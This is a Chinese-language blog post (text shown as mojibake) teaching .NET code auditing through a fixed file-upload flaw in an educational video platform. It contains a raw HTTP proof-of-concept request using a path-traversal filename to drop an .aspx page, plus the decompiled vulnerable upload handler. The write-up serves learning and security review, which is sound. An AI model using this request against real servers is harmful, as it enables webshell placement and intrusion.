<!DOCTYPE html>
<html>
    <head>
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
  <meta name="robots" content="index, follow">
  <!-- title -->
  
    
  <title>ä»æŸæ•™å­¦è§†é¢‘åº”ç”¨äº‘å¹³å°å…¥é—¨.netå®¡è®¡ - Hello Hehanzzz~</title>
    
  
  
  <!-- open graph -->
  <meta name="description" content=".netä»£ç å®¡è®¡å…¥é—¨">
<meta property="og:type" content="article">
<meta property="og:title" content="ä»æŸæ•™å­¦è§†é¢‘åº”ç”¨äº‘å¹³å°å…¥é—¨.netå®¡è®¡">
<meta property="og:url" content="https://hehanzzz.github.io/2023/12/24/%E4%BB%8E%E6%9F%90%E6%95%99%E5%AD%A6%E8%A7%86%E9%A2%91%E5%BA%94%E7%94%A8%E4%BA%91%E5%B9%B3%E5%8F%B0%E5%85%A5%E9%97%A8-net%E5%AE%A1%E8%AE%A1/index.html">
<meta property="og:site_name" content="Hello Hehanzzz~">
<meta property="og:description" content=".netä»£ç å®¡è®¡å…¥é—¨">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://oss.hehanzzz.icu/img/202405061250304.png">
<meta property="og:image" content="http://oss.hehanzzz.icu/img/202405061250620.png">
<meta property="og:image" content="http://oss.hehanzzz.icu/img/202405061250085.png">
<meta property="og:image" content="http://oss.hehanzzz.icu/img/202405061250555.png">
<meta property="og:image" content="http://oss.hehanzzz.icu/img/202405061250160.png">
<meta property="og:image" content="http://oss.hehanzzz.icu/img/202405061250717.png">
<meta property="og:image" content="http://oss.hehanzzz.icu/img/202405061250070.png">
<meta property="og:image" content="http://oss.hehanzzz.icu/img/202405061250070.png">
<meta property="og:image" content="http://oss.hehanzzz.icu/img/202405061250813.png">
<meta property="og:image" content="http://oss.hehanzzz.icu/img/202405061250693.png">
<meta property="og:image" content="http://oss.hehanzzz.icu/img/202405061250308.png">
<meta property="og:image" content="http://oss.hehanzzz.icu/img/202405061250630.png">
<meta property="article:published_time" content="2023-12-24T13:01:14.000Z">
<meta property="article:modified_time" content="2024-05-06T09:01:12.491Z">
<meta property="article:author" content="Hehanzzz">
<meta property="article:tag" content="ä»£ç å®¡è®¡">
<meta property="article:tag" content="ASP.NET">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://oss.hehanzzz.icu/img/202405061250304.png">
  <!-- canonical -->
  
  <link rel="canonical" href="https://hehanzzz.github.io/2023/12/24/ä»æŸæ•™å­¦è§†é¢‘åº”ç”¨äº‘å¹³å°å…¥é—¨-netå®¡è®¡/">
  
  <!-- Favicon -->
  <link rel="shortcut icon" href="/img/favicon.ico">
  <link rel="apple-touch-icon" sizes="180x180" href="/img/apple-touch-icon.png">
  <!-- CSS -->
  
<link rel="stylesheet" href="/css/reset.css">

  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/markdown.css">

  
<link rel="stylesheet" href="/css/fonts.css">

<meta name="generator" content="Hexo 7.0.0"></head>

    <body>
        <div class="paper">
            <div class="paper-main">
                
                    <div class="post-header">
    <a class="logo" href="/">Hello Hehanzzz~</a>
    <!-- <div class="logo"><a href="/" title="Len"><img src="/img/logo.svg" alt="Len" aria-label="logo" height="20"></a></div> -->
        <ul class="nav">
            
            <li><a href="/">Home</a></li>
            
            <li><a href="/about">About</a></li>
            
            <li><a href="/archives">Archives</a></li>
            
        </ul>


    </a>
</div>

                
                <div class="post-main">
    
        <div class="post-main-title">
            ä»æŸæ•™å­¦è§†é¢‘åº”ç”¨äº‘å¹³å°å…¥é—¨.netå®¡è®¡
        </div>
        <div class="post-meta">
            2023-12-24 ï½œ 
            
        </div>
        <!-- åœ†è§’åˆ†ç±» -->
        <!-- <div class="tags"> -->
            <!--  -->
        <!-- </div> -->
        <div class="post-md">
            <p>.netä»£ç å®¡è®¡å…¥é—¨</p>
<span id="more"></span>

<h1 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h1><p>å‰æ®µæ—¶é—´æ·±æƒ…çˆ·ç»™æˆ‘å‘äº†ä¸€ä¸ªPocï¼Œæ˜¯æŸæ•™å­¦è§†é¢‘åº”ç”¨äº‘å¹³å°çš„æ–‡ä»¶ä¸Šä¼ ï¼Œæ•…äº‹ä¹Ÿä»è¿™é‡Œå±•å¼€â€¦â€¦</p>
<p>å¾—åˆ°Pocåè¯•äº†ä¸€ä¸‹ï¼Œä¸€ä¸å°å¿ƒæ‰¾åˆ°äº†æºç ï¼ˆçœŸÂ·çº¯å®‰è£…æºç ï¼‰ï¼Œæ‹¿åˆ°è‡ªå·±ç”µè„‘ä¸Šè¿›è¡Œä¸€é€šçæï¼Œä¸€å¤´é›¾æ°´</p>
<p>ç”±äºè‡ªå·±ä¹‹å‰æ²¡æ¥è§¦è¿‡.netçš„å®¡è®¡ï¼Œäºæ˜¯è·Ÿå‡ ä¸ªå¸ˆå‚…å­¦ä¹ äº†ä¸€ä¸‹.netçš„å®¡è®¡æ–¹æ³•ï¼Œä¹Ÿæ˜¯æ‹¿åˆ°äº†ä»–ä»¬çš„å®¡è®¡æŠ¥å‘Šè¿›è¡Œå­¦ä¹ ï¼Œç”±äºè¿™å¥—ä»£ç æ¯”è¾ƒç®€å•ï¼Œä¹Ÿå±äºæ˜¯å…¥é—¨çº§åˆ«ï¼Œäºæ˜¯æ‰“ç®—è®°å½•ä¸‹æ¥ã€‚</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç›®å‰æŒ–å‡ºçš„æ‰€æœ‰æ¼æ´å®˜æ–¹éƒ½å·²ä¿®å¤ï¼è¯·å‹¿ç”¨äºè¿æ³•ç”¨é€”ï¼Œæœ¬æ–‡ä»…ä¾›å­¦ä¹ ã€‚</p>
<p><img src="http://oss.hehanzzz.icu/img/202405061250304.png"></p>
<h1 id="0x01-å‰ç½®çŸ¥è¯†"><a href="#0x01-å‰ç½®çŸ¥è¯†" class="headerlink" title="0x01 å‰ç½®çŸ¥è¯†"></a>0x01 å‰ç½®çŸ¥è¯†</h1><p>.netæ˜¯ä¸€æ¬¾å¯ä»¥ä½¿ç”¨ C#ã€F# æˆ– Visual Basic ç¼–å†™çš„æ¡†æ¶ï¼Œæœ¬æ„æ˜¯å¾®è½¯ç”¨æ¥å¯¹æ ‡JAVAçš„ï¼Œæœ‰å…³çš„è¯­è¨€å­¦ä¹ å¯ä»¥çœ‹çœ‹å®˜ç½‘ï¼š<a target="_blank" rel="noopener" href="https://dotnet.microsoft.com/zh-cn/languages">.NET ç¼–ç¨‹è¯­è¨€ | C#ã€F# å’Œ Visual Basic (microsoft.com)</a></p>
<p>åœ¨.netä¸­é€šå¸¸ä½¿ç”¨C#è¯­è¨€è¿›è¡Œç¼–å†™ï¼Œé€šå¸¸åˆ¤æ–­ç½‘ç«™æ˜¯å¦æ˜¯.netç½‘ç«™å¯ä»¥çœ‹çœ‹ä»–çš„åç¼€æ˜¯å•¥ï¼Œaspxå°±æ˜¯.netçš„ç½‘ç«™ï¼Œåœ¨æ‹¿åˆ°ä¸€ä»½.netæºç çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¾—äº†è§£æ¯ä¸ªC#æ–‡ä»¶çš„ä½œç”¨å«ä¹‰ï¼Œäº†è§£å¦‚ä½•è¿›è¡Œå®¡è®¡ï¼Œå·¥å…·æ˜¯ä»€ä¹ˆï¼Œè·¯ç”±æ€ä¹ˆçœ‹</p>
<h2 id="C-æ–‡ä»¶åç¼€ä½œç”¨åŠä½ç½®"><a href="#C-æ–‡ä»¶åç¼€ä½œç”¨åŠä½ç½®" class="headerlink" title="C#æ–‡ä»¶åç¼€ä½œç”¨åŠä½ç½®"></a>C#æ–‡ä»¶åç¼€ä½œç”¨åŠä½ç½®</h2><ol>
<li><strong>.aspxï¼š</strong><ul>
<li><strong>ç”¨é€”ï¼š</strong> ASP.NET ç½‘é¡µæ–‡ä»¶ã€‚</li>
<li><strong>æè¿°ï¼š</strong> åŒ…å«ç½‘é¡µçš„æ ‡è®°å’ŒæœåŠ¡å™¨ç«¯ä»£ç ï¼Œç”¨äºæ„å»ºåŠ¨æ€çš„ Web é¡µé¢ã€‚</li>
</ul>
</li>
<li><strong>.csï¼š</strong><ul>
<li><strong>ç”¨é€”ï¼š</strong> C# æºä»£ç æ–‡ä»¶ã€‚</li>
<li><strong>æè¿°ï¼š</strong> åŒ…å« C# ç¼–ç¨‹è¯­è¨€çš„æºä»£ç ï¼Œç”¨äºå®ç°åº”ç”¨ç¨‹åºçš„é€»è¾‘å’ŒåŠŸèƒ½ã€‚</li>
</ul>
</li>
<li><strong>.aspx.csï¼š</strong><ul>
<li><strong>ç”¨é€”ï¼š</strong> ASP.NET ç½‘é¡µçš„ä»£ç æ–‡ä»¶ï¼ˆä¸ .aspx é…å¥—ï¼‰ã€‚</li>
<li><strong>æè¿°ï¼š</strong> åŒ…å«ä¸ .aspx æ–‡ä»¶ç›¸å…³è”çš„ C# ä»£ç ï¼Œç”¨äºå¤„ç†é¡µé¢çš„æœåŠ¡å™¨ç«¯é€»è¾‘ã€‚</li>
</ul>
</li>
<li><strong>.ascxï¼š</strong><ul>
<li><strong>ç”¨é€”ï¼š</strong> ASP.NET ç”¨æˆ·æ§ä»¶æ–‡ä»¶ã€‚</li>
<li><strong>æè¿°ï¼š</strong> åŒ…å«å¯åœ¨å¤šä¸ªé¡µé¢ä¸­é‡å¤ä½¿ç”¨çš„è‡ªå®šä¹‰ç”¨æˆ·ç•Œé¢ç»„ä»¶ï¼Œç”¨äºæé«˜ä»£ç çš„å¯ç»´æŠ¤æ€§å’Œå¯é‡ç”¨æ€§ã€‚</li>
</ul>
</li>
<li><strong>.asmxï¼š</strong><ul>
<li><strong>ç”¨é€”ï¼š</strong> ASP.NET Web æœåŠ¡æ–‡ä»¶ã€‚</li>
<li><strong>æè¿°ï¼š</strong> åŒ…å«ç”¨äºæä¾› Web æœåŠ¡çš„ä»£ç å’Œé€»è¾‘ï¼Œæ”¯æŒé€šè¿‡ SOAPï¼ˆSimple Object Access Protocolï¼‰è¿›è¡Œé€šä¿¡ã€‚</li>
</ul>
</li>
<li><strong>.asaxï¼š</strong><ul>
<li><strong>ç”¨é€”ï¼š</strong> å…¨å±€åº”ç”¨ç¨‹åºç±»æ–‡ä»¶ã€‚</li>
<li><strong>æè¿°ï¼š</strong> åŒ…å«åº”ç”¨ç¨‹åºçš„å…¨å±€äº‹ä»¶å¤„ç†å’Œåˆå§‹åŒ–ä»£ç ï¼Œå¦‚åº”ç”¨ç¨‹åºå¯åŠ¨æ—¶çš„é€»è¾‘ã€‚</li>
</ul>
</li>
<li><strong>.soapï¼š</strong><ul>
<li><strong>ç”¨é€”ï¼š</strong> SOAP æ–‡ä»¶ã€‚</li>
<li><strong>æè¿°ï¼š</strong> åŒ…å«ä½¿ç”¨ SOAP åè®®å®šä¹‰çš„ Web æœåŠ¡çš„æè¿°ä¿¡æ¯ã€‚</li>
</ul>
</li>
<li><strong>.dllï¼š</strong><ul>
<li><strong>ç”¨é€”ï¼š</strong> åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ã€‚</li>
<li><strong>æè¿°ï¼š</strong> åŒ…å«å·²ç¼–è¯‘çš„ä»£ç å’Œåº“ï¼Œå¯ä¾›åº”ç”¨ç¨‹åºè°ƒç”¨å’Œé‡ç”¨ã€‚é€šå¸¸ç”¨äºå°†ä»£ç åˆ†å‰²æˆæ¨¡å—ï¼Œæé«˜å¯ç»´æŠ¤æ€§å’Œå¤ç”¨æ€§ã€‚</li>
</ul>
</li>
</ol>
<p>ç”¨æ­¤å¯çœ‹å‡º <strong>dllã€aspxã€aspx.cs</strong> è¿™ä¸‰ä¸ªæ–‡ä»¶æ˜¯æˆ‘ä»¬éœ€è¦å»å…³æ³¨çš„</p>
<p>åœ¨ä¸€ä¸ªå…¸å‹çš„ ASP.NET Web åº”ç”¨ç¨‹åºä¸­ï¼Œ.dllã€.aspx å’Œ .aspx.cs æ–‡ä»¶é€šå¸¸åˆ†å¸ƒåœ¨ä¸åŒçš„ç›®å½•ä¸­ï¼š</p>
<ol>
<li><strong>.dll æ–‡ä»¶ï¼š</strong><ul>
<li><strong>ä½ç½®ï¼š</strong> .dll æ–‡ä»¶é€šå¸¸ä½äºåº”ç”¨ç¨‹åºçš„ bin ç›®å½•ä¸­ã€‚</li>
<li><strong>æè¿°ï¼š</strong> è¿™é‡Œå­˜æ”¾äº†ç¼–è¯‘åçš„ç¨‹åºé›†æ–‡ä»¶ï¼ŒåŒ…å«äº†åº”ç”¨ç¨‹åºçš„å·²ç¼–è¯‘ä»£ç ã€‚è¿™äº›æ–‡ä»¶åœ¨è¿è¡Œæ—¶ç”± ASP.NET åº”ç”¨ç¨‹åºå¼•æ“åŠ è½½ã€‚</li>
</ul>
</li>
<li><strong>.aspx æ–‡ä»¶ï¼š</strong><ul>
<li><strong>ä½ç½®ï¼š</strong> .aspx æ–‡ä»¶é€šå¸¸ä½äºåº”ç”¨ç¨‹åºçš„ Web é¡µé¢ç›®å½•ä¸­ï¼Œä¾‹å¦‚ Pages æˆ– Views ç›®å½•ã€‚</li>
<li><strong>æè¿°ï¼š</strong> è¿™æ˜¯ ASP.NET Web é¡µé¢æ–‡ä»¶ï¼ŒåŒ…å«äº†é¡µé¢çš„ HTML æ ‡è®°å’Œå¯èƒ½çš„æœåŠ¡å™¨ç«¯ä»£ç å—ã€‚</li>
</ul>
</li>
<li><strong>.aspx.cs æ–‡ä»¶ï¼š</strong><ul>
<li><strong>ä½ç½®ï¼š</strong> .aspx.cs æ–‡ä»¶é€šå¸¸ä½äºä¸ .aspx æ–‡ä»¶ç›¸åŒçš„ç›®å½•ä¸­ï¼Œä½†é€šå¸¸è¢«ç»„ç»‡åœ¨ App_Code æˆ– CodeBehind ç­‰å­ç›®å½•ä¸­ã€‚</li>
<li><strong>æè¿°ï¼š</strong> è¿™æ˜¯ä¸ .aspx æ–‡ä»¶å…³è”çš„æœåŠ¡å™¨ç«¯ä»£ç æ–‡ä»¶ï¼ŒåŒ…å«äº†ä¸é¡µé¢ç›¸å…³çš„ C# æˆ– VB.NET ä»£ç ã€‚</li>
</ul>
</li>
</ol>
<p>ä¾‹å¦‚ï¼Œä¸€ä¸ªç®€å•çš„ç›®å½•ç»“æ„å¯èƒ½å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/YourWebApp</span><br><span class="line">  /bin</span><br><span class="line">    YourWebApp.dll</span><br><span class="line">  /Pages</span><br><span class="line">    Home.aspx</span><br><span class="line">    Home.aspx.cs</span><br><span class="line">  /App_Code</span><br><span class="line">    CommonFunctions.cs</span><br><span class="line">  Web.config</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼š</p>
<ul>
<li>&#x2F;bin ç›®å½•åŒ…å«å·²ç¼–è¯‘çš„  .dll  æ–‡ä»¶ã€‚</li>
<li>&#x2F;Pages ç›®å½•åŒ…å« Web é¡µé¢çš„  .aspx  å’Œ  .aspx.cs æ–‡ä»¶ã€‚</li>
<li>&#x2F;App_Code ç›®å½•åŒ…å«å…±äº«çš„æœåŠ¡å™¨ç«¯ä»£ç æ–‡ä»¶ã€‚</li>
</ul>
<h2 id="åç¼–è¯‘å·¥å…·ILSpy"><a href="#åç¼–è¯‘å·¥å…·ILSpy" class="headerlink" title="åç¼–è¯‘å·¥å…·ILSpy"></a>åç¼–è¯‘å·¥å…·ILSpy</h2><p>å‰é¢æåˆ° dll ä¸­å­˜åœ¨ç€æˆ‘ä»¬æ ¸å¿ƒçš„ä»£ç å†…å®¹ï¼Œé‚£ä¹ˆåº”è¯¥å¦‚ä½•æŸ¥çœ‹å‘¢ï¼Œè¿™é‡Œæ¨èä½¿ç”¨ä¸€æ¬¾å·¥å…· ILSpy ï¼Œè¿™æ¬¾å·¥å…·å¯¹å¯ä»¥dllæ–‡ä»¶è¿›è¡Œåç¼–è¯‘ï¼ŒæŸ¥çœ‹å…¶å†…éƒ¨ä»£ç å†…å®¹ï¼Œä¹Ÿå¾ˆæ–¹ä¾¿çš„å°†å†…éƒ¨ä»£ç å…¨éƒ¨å¯¼å‡ºä¸ºæ­£å¸¸çš„ .csã€‚</p>
<p>å®˜æ–¹ä»“åº“é“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://github.com/icsharpcode/ILSpy">icsharpcode&#x2F;ILSpy: .NET Decompiler with support for PDB generation, ReadyToRun, Metadata (&amp;more) - cross-platform! (github.com)</a></p>
<p><img src="http://oss.hehanzzz.icu/img/202405061250620.png"></p>
<p>è¿™é‡Œåœ¨å·¦ä¸Šè§’çš„æ–‡ä»¶å¯¼å…¥dllæ–‡ä»¶å³å¯</p>
<h2 id="aspxæ–‡ä»¶å†…å®¹è§£æ"><a href="#aspxæ–‡ä»¶å†…å®¹è§£æ" class="headerlink" title="aspxæ–‡ä»¶å†…å®¹è§£æ"></a>aspxæ–‡ä»¶å†…å®¹è§£æ</h2><p>é€šå¸¸åœ¨æˆ‘ä»¬æ‰“å¼€aspxæ–‡ä»¶æ—¶ï¼Œç¬¬ä¸€è¡Œä¼šæ˜¯ä»¥ä¸‹è¿™æ ·ï¼š</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=<span class="string">&quot;C#&quot;</span> AutoEventWireup=<span class="string">&quot;true&quot;</span> CodeBehind=<span class="string">&quot;MyPage.aspx.cs&quot;</span> Inherits=<span class="string">&quot;MyWebApp.MyPage&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯ä¸€ä¸ª ASP.NET Web é¡µé¢çš„æŒ‡ä»¤ï¼ˆDirectiveï¼‰ï¼Œç”¨äºåœ¨é¡µé¢ä¸­æŒ‡å®šä¸€äº›é‡è¦çš„å±æ€§å’Œé…ç½®</p>
<p>è§£æå¦‚ä¸‹ï¼š</p>
<ul>
<li><strong>&lt;%@ Pageï¼š</strong> è¿™æ˜¯æŒ‡ä»¤çš„èµ·å§‹æ ‡è®°ï¼Œç”¨äºå®šä¹‰é¡µé¢çš„å±æ€§å’Œé…ç½®ã€‚</li>
<li><strong>Language&#x3D;â€C#â€ï¼š</strong> æŒ‡å®šæœåŠ¡å™¨ç«¯ä»£ç ä½¿ç”¨çš„ç¼–ç¨‹è¯­è¨€ï¼Œè¿™é‡Œæ˜¯ C#ã€‚</li>
<li><strong>AutoEventWireup&#x3D;â€trueâ€ï¼š</strong> ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæ˜¯å¦å¯ç”¨è‡ªåŠ¨äº‹ä»¶ç»‘å®šã€‚å½“è®¾ç½®ä¸º true æ—¶ï¼ŒASP.NET å°†è‡ªåŠ¨ç»‘å®šäº‹ä»¶å¤„ç†ç¨‹åºã€‚</li>
<li><strong>CodeBehind&#x3D;â€MyPage.aspx.csâ€ï¼š</strong> æŒ‡å®šä»£ç æ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œä»£ç æ–‡ä»¶åä¸º MyPage.aspx.csï¼Œå®ƒé€šå¸¸åŒ…å«é¡µé¢çš„æœåŠ¡å™¨ç«¯é€»è¾‘ã€‚</li>
<li><strong>Inherits&#x3D;â€MyWebApp.MyPageâ€ï¼š</strong> æŒ‡å®šé¡µé¢çš„ç»§æ‰¿å…³ç³»ã€‚è¿™é‡Œï¼ŒMyPage é¡µé¢ç»§æ‰¿è‡ª MyWebApp.MyPage ç±»ã€‚Inherits å±æ€§å‘Šè¯‰ ASP.NET ä½¿ç”¨æŒ‡å®šç±»ä¸­çš„ä»£ç ã€‚</li>
</ul>
<p>é€šè¿‡è¿™ä¸ªæŒ‡ä»¤ï¼ŒASP.NET å¯ä»¥æ­£ç¡®åœ°å¤„ç†é¡µé¢ï¼Œç¼–è¯‘ä»£ç æ–‡ä»¶ï¼Œç„¶åå°†å…¶ä¸é¡µé¢å…³è”èµ·æ¥ã€‚è¿™ä½¿å¾—åœ¨ .aspx é¡µé¢ä¸­å¯ä»¥ä½¿ç”¨ä¸ .aspx.cs æ–‡ä»¶å…³è”çš„æœåŠ¡å™¨ç«¯ä»£ç </p>
<p>åœ¨ä¸€èˆ¬çš„.NETä»£ç ä¸­ï¼Œæˆ‘ä»¬éœ€è¦ç‰¹åˆ«æ³¨æ„ inheritsï¼ˆç»§æ‰¿ï¼‰éƒ¨åˆ†ã€‚å®ƒä¼šæŒ‡å‘æˆ‘ä»¬éœ€è¦å»æ‰¾çš„ dll ï¼Œä¾‹å¦‚å‰é¢çš„ç¤ºä¾‹å¯èƒ½æŒ‡å‘çš„æ˜¯ MyWebApp.dll ï¼Œåœ¨MyWebApp.dllä¸­å¯»æ‰¾MyPage</p>
<h1 id="0x02-Pocâ€”å‰å°Ndayä¸Šä¼ "><a href="#0x02-Pocâ€”å‰å°Ndayä¸Šä¼ " class="headerlink" title="0x02 Pocâ€”å‰å°Ndayä¸Šä¼ "></a>0x02 Pocâ€”å‰å°Ndayä¸Šä¼ </h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">POST /Tools/Video/VideoCover.aspx HTTP/1.1</span><br><span class="line">Host: xxx</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insectre-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 1015 7) AppleWebKit/537.36(KHTML, like Gecko) Chrome/107.0.0.0 Safari 537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avifimage/webp,image/apng,*/*;q=0.8,application/signed-exchangev=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Accept-Language: zh-CN,zh;g=0.9</span><br><span class="line">Cookie: ASP.NET_SessionId=pgfnw0patx4kh0jsnpjgzcmq; PrivateKey=f09020eaf656f9cf5d9292d39c296d1c</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type:multipart/form-data;boundary=----WebKitFormBoundaryVBf7Cs8QWsfwC82M</span><br><span class="line">Content-Length: 294</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryVBf7Cs8QWsfwC82M</span><br><span class="line">Content-Disposition: form-data, name= &quot;file&quot;;filename=&quot;/../../../AVA.ResourcesPlatform.WebUI/test.aspx&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;%@Page Language=&quot;C#&quot;%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">Response.Write(&quot;test&quot;);</span><br><span class="line">%&gt;</span><br><span class="line">------WebKitFormBoundaryVBf7Cs8QWsfwC82M--</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ ¹æ®Pocåœ¨æ ¹ç›®å½•ä¸­ Tools&#x2F;Video ä¸‹æ‰¾åˆ° VideoPath.aspx </p>
<p><img src="http://oss.hehanzzz.icu/img/202405061250085.png"></p>
<p>è¿™é‡Œ Inherits æŒ‡å‘çš„æ˜¯ AVA.ResourcesPlatform.AdminUI.Services.WeikeCutOut.UploadFile  ç±»ï¼ŒInherits å±æ€§å‘Šè¯‰ ASP.NET è¿™ä¸ªé¡µé¢å°†ä½¿ç”¨æŒ‡å®šç±»ä¸­çš„ä»£ç ã€‚è¿™é‡Œä¹Ÿè¯´äº†UploadFile é¡µé¢ç»§æ‰¿è‡ª AVA.ResourcesPlatform.AdminUI.Services.WeikeCutOut.UploadFile ç±»</p>
<p>æ‰€ä»¥æˆ‘ä»¬å» bin ç›®å½•ä¸‹æ‰¾åˆ° AVA.ResourcesPlatform.AdminUI.dll</p>
<p><img src="http://oss.hehanzzz.icu/img/202405061250555.png"></p>
<p>æŠŠè¿™ä¸ªdllç›´æ¥ä¸¢åˆ°ILSpyè¿›è¡Œåç¼–è¯‘ï¼Œåœ¨å·¦ä¾§æ ä¸­æ‰¾åˆ°å¯¹åº”çš„UploadFile</p>
<p><img src="http://oss.hehanzzz.icu/img/202405061250160.png"></p>
<p>æŠŠä»£ç ä¸¢å‡ºæ¥çœ‹çœ‹ä¸ºä»€ä¹ˆä¼šå­˜åœ¨æ–‡ä»¶ä¸Šä¼ </p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Web;</span><br><span class="line"><span class="keyword">using</span> System.Web.UI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">UploadFile</span> : <span class="title">Page</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">Page_Load</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">base</span>.Request.Files.Count &lt;= <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">try</span></span><br><span class="line">		&#123;</span><br><span class="line">			HttpPostedFile httpPostedFile = <span class="keyword">base</span>.Request.Files[<span class="number">0</span>];</span><br><span class="line">			<span class="built_in">string</span> fileName = httpPostedFile.FileName;</span><br><span class="line">			<span class="built_in">string</span> text = <span class="keyword">base</span>.Request.QueryString[<span class="string">&quot;VideoGuid&quot;</span>];</span><br><span class="line">			<span class="built_in">string</span> text2 = <span class="keyword">base</span>.Server.MapPath(<span class="string">&quot;~/Upload/Video/&quot;</span> + text + <span class="string">&quot;/&quot;</span>);</span><br><span class="line">			<span class="keyword">if</span> (!Directory.Exists(text2))</span><br><span class="line">			&#123;</span><br><span class="line">				Directory.CreateDirectory(text2);</span><br><span class="line">			&#125;</span><br><span class="line">			text2 += httpPostedFile.FileName;</span><br><span class="line">			httpPostedFile.SaveAs(text2);</span><br><span class="line">			<span class="keyword">base</span>.Response.Clear();</span><br><span class="line">			<span class="keyword">base</span>.Response.Write(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span> (Exception ex)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">base</span>.Response.Clear();</span><br><span class="line">			<span class="keyword">base</span>.Response.Write(ex.Message);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆå¼€å¤´å¯¼å…¥å››ä¸ªå‘½åç©ºé—´</p>
<ol>
<li>using System;ï¼š<ul>
<li>å¯¼å…¥ System å‘½åç©ºé—´ï¼Œè¿™æ˜¯.NETæ¡†æ¶ä¸­æœ€åŸºæœ¬çš„å‘½åç©ºé—´ä¹‹ä¸€ï¼ŒåŒ…å«äº†å¸¸ç”¨çš„ç³»ç»Ÿç±»å‹å’ŒåŠŸèƒ½ã€‚ä¾‹å¦‚ï¼Œ Exception å¼‚å¸¸å°±åœ¨ System å‘½åç©ºé—´ä¸­å®šä¹‰ã€‚</li>
</ul>
</li>
<li>using System.IO;ï¼š<ul>
<li>å¯¼å…¥ System.IO å‘½åç©ºé—´ï¼Œè¯¥å‘½åç©ºé—´æä¾›äº†æ–‡ä»¶å’Œæµçš„è¾“å…¥è¾“å‡ºæ“ä½œç›¸å…³çš„ç±»ã€‚åœ¨è¿™æ®µä»£ç ä¸­ï¼Œä¸»è¦ç”¨äºå¤„ç†æ–‡ä»¶å’Œç›®å½•çš„æ“ä½œï¼Œæ¯”å¦‚åˆ›å»ºç›®å½•å’Œä¿å­˜æ–‡ä»¶ã€‚</li>
</ul>
</li>
<li>using System.Web;ï¼š<ul>
